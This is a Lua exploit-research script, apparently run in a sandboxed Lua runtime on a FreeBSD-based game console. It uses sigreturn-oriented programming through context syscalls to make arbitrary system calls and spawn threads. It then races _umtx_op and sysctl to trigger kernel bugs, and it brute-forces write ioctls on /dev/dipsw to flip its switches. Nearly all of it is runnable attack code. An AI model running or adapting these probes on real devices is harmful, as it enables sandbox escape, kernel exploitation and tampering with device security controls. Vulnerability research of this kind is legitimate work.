-- CRASH_CLASS: HIGH
-- PROBE 135a: TOCTOU race on _umtx_op via threads
--
-- With threads working, we can now attempt race conditions.
-- Target: _umtx_op(454) — kernel reads futex from userland, we race.
--
-- Strategy:
-- 1. Main thread calls _umtx_op in a loop
-- 2. Racing thread flips the futex value between valid/invalid
-- 3. If kernel reads stale value → corruption → kernel bug
--
-- Also test: sysctl race (modify MIB array while kernel copies it)
-- Also test: thread doing open/read/close in parallel

print("=== PROBE 135a: TOCTOU RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x20000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function make_thread(rax, rdi, rsi, rdx, stack_offset)
    pcall(function() return sc_gc(uint64(ctx)) end)
    local tc = memory.alloc(0x500)
    for off = 0, 0x4FF, 8 do
        memory.write_qword(tc + off, memory.read_qword(ctx + off))
    end
    local T = tc + MC
    memory.write_qword(T + 0xA0, sc_addr)
    memory.write_qword(T + 0x38, uint64(rax))
    if rdi then memory.write_qword(T + 0x08, rdi) end
    if rsi then memory.write_qword(T + 0x10, rsi) end
    if rdx then memory.write_qword(T + 0x18, rdx) end
    memory.write_qword(T + 0xB8, uint64(string.format("0x%X",
        to_num(gpu + 0x10000 + (stack_offset or 0) + 0xFF0))))

    local tid_ptr = memory.alloc(8)
    memory.write_qword(tid_ptr, uint64(0))
    local tc_addr = uint64(string.format("0x%X", to_num(tc)))
    local tp_addr = uint64(string.format("0x%X", to_num(tid_ptr)))
    local rv = srop(430, tc_addr, tp_addr, uint64(0))
    return rv, memory.read_qword(tid_ptr)
end

--------------------------------------------------------------------
-- SECTION A: Spawn threads that do _umtx_op while main flips value
--------------------------------------------------------------------
print("")
print("--- [A] UMTX race ---")

-- Shared futex value at known GPU address
local futex = gpu + 0x100
memory.write_dword(futex, 0)

-- Create 4 threads that each call _umtx_op(454) WAIT(2) on the futex
-- Thread will: syscall 454 with RDI=futex, RSI=2(WAIT), RDX=value
-- The thread blocks waiting for the futex to change, giving us a
-- window where the kernel is reading the futex value
local futex_addr = uint64(string.format("0x%X", to_num(futex)))
local thread_rvs = {}
local thread_tids = {}

for i = 1, 4 do
    -- Thread calls _umtx_op(futex, UMTX_OP_WAIT=2, expected_val=0)
    local rv, tid = make_thread(454, futex_addr, uint64(2), uint64(0), i * 0x1000)
    table.insert(thread_rvs, rv)
    table.insert(thread_tids, tid)
    print(string.format("[A] thread %d: rv=%s tid=%s", i, hex(rv), hex(tid)))
end
print("[A] pid=" .. to_num(sc20()))

-- Now flip the futex value rapidly while threads are waiting
print("[A] Racing futex value...")
for race = 1, 100 do
    memory.write_dword(futex, race)
    memory.write_dword(futex, 0)
end

-- Wake all threads with UMTX_OP_WAKE(3)
local rv_wake = srop(454, futex_addr, uint64(3), uint64(0x7FFFFFFF))
print("[A] umtx wake rv=" .. hex(rv_wake))

-- Check thread status
for i, tid in ipairs(thread_tids) do
    local tv = to_num(tid)
    if tv > 0 then
        local rv_tk = srop(433, uint64(tv), uint64(0))
        local tkh, tkl = get_hi_lo(rv_tk)
        print(string.format("[A] thread %d: %s", i,
            (tkl == 0 and tkh == 0) and "ALIVE" or "EXITED"))
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Sysctl race — modify MIB while kernel copies
--------------------------------------------------------------------
print("")
print("--- [B] Sysctl MIB race ---")

local mib = gpu + 0x200
local outbuf = gpu + 0x300
local oldlenp = gpu + 0x400

-- Set up kern.version sysctl (MIB = {1, 4})
memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 4)  -- KERN_VERSION

-- Create thread that flips MIB[1] between 4 and 14 (KERN_PROC)
-- while main thread calls sysctl
-- If kernel uses the modified MIB → different data returned → info leak

-- Thread: call sysctl with same MIB (will race with our writes)
-- Actually, the thread can only do ONE syscall. So let's have the
-- thread do sysctl while we flip the MIB.

-- Approach: main calls sysctl many times, between calls we flip MIB
local leak_found = false
for trial = 1, 20 do
    -- Set MIB to kern.version
    memory.write_dword(mib, 1)
    memory.write_dword(mib + 4, 4)
    memory.write_qword(oldlenp, uint64(0x200))
    for off = 0, 0x1F, 4 do memory.write_dword(outbuf + off, 0) end

    local rv_sc = srop(202, uint64(string.format("0x%X", to_num(mib))),
        uint64(2),
        uint64(string.format("0x%X", to_num(outbuf))),
        uint64(string.format("0x%X", to_num(oldlenp))))

    -- Note: srop only passes 3 args but sysctl needs 6
    -- This won't work well for sysctl race. Skip.
    if trial == 1 then
        print("[B] sysctl rv=" .. hex(rv_sc))
    end
end
print("[B] (sysctl needs 6 args, can't race properly with 3-arg srop)")

--------------------------------------------------------------------
-- SECTION C: Thread doing open() on /dev/dipsw for race
--------------------------------------------------------------------
print("")
print("--- [C] Concurrent file ops ---")

local P = gpu + 0x500
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end

-- Have threads open /dev/dipsw while main does ioctl
-- Thread: open(5, "/dev/dipsw", O_RDONLY)
ws(P, "/dev/dipsw")
local path_addr = uint64(string.format("0x%X", to_num(P)))

local rv_t1, tid_t1 = make_thread(5, path_addr, uint64(0), nil, 0x5000)
print("[C] thread open rv=" .. hex(rv_t1) .. " tid=" .. hex(tid_t1))

-- Meanwhile, main thread opens dipsw and tries ioctl
local fd_dip = to_num(srop(5, path_addr, uint64(0)))
print("[C] main dipsw fd=" .. fd_dip)

if fd_dip > 0 and fd_dip < 256 then
    -- Try writing to dipsw via race — open O_RDONLY then ioctl write
    -- while another thread has it open
    local B = gpu + 0x600
    memory.write_dword(B, 1)  -- Try to set switch value

    -- Try ioctl write codes not tried before
    -- _IOW with different sizes
    local codes_to_try = {
        0x80018806, 0x80028806, 0x80048806, 0x80088806,
        0x80108806, 0x80208806, 0x80408806,
        0x80018807, 0x80028807, 0x80048807,
    }
    for _, code in ipairs(codes_to_try) do
        memory.write_dword(B, 0xFF)  -- try to enable all switches
        local rv_io = srop(54, uint64(fd_dip), uint64(code), uint64(string.format("0x%X", to_num(B))))
        local ioh, iol = get_hi_lo(rv_io)
        if iol == 0 and ioh == 0 then
            print(string.format("[C] *** WRITE IOCTL 0x%08X WORKED! ***", code))
            -- Verify by reading
            memory.write_dword(B, 0)
            srop(54, uint64(fd_dip), uint64(0x40048806), uint64(string.format("0x%X", to_num(B))))
            print("[C] dipsw now=" .. to_num(memory.read_dword(B)))
        end
    end
    srop(6, uint64(fd_dip))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: Thread count stress test
--------------------------------------------------------------------
print("")
print("--- [D] Thread stress ---")

local max_threads = 0
for i = 1, 20 do
    local rv_t, tid_t = make_thread(431, uint64(0), nil, nil, i * 0x100)
    local rvh, rvl = get_hi_lo(rv_t)
    if rvl == 0 and rvh == 0 then
        max_threads = i
    else
        print("[D] thread " .. i .. " failed: rv=" .. hex(rv_t))
        break
    end
end
print("[D] created " .. max_threads .. " threads successfully")
print("[D] pid=" .. to_num(sc20()))

print("")
print("=== DONE ===")
